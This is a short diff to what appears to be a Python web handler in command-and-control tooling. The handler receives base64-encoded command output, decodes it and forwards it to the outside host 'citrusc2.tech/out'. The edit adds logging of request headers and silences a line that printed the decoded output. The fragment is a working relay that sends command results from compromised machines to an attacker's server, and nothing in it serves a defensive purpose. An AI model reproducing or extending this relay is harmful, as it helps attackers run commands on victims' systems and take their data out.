@@ -26,12 +26,13 @@ def cmdoutput(input_encoding):
     #l = request.form.keys()
     #output = ""
     #output = output.join(l)
+    print(dict(request.headers))
     padding_to_readd = int(input_encoding[-1])
     input_encoding = input_encoding + ("=" * padding_to_readd)
     base64_bytes = input_encoding.encode('ascii')
     message_bytes = base64.b64decode(base64_bytes)
     message = message_bytes.decode('ascii')
-    print("CMDOUTPUT: " + message)
+    #print("CMDOUTPUT: " + message)
     r = requests.post('http://citrusc2.tech/out', data={'output': message})
     return message
 
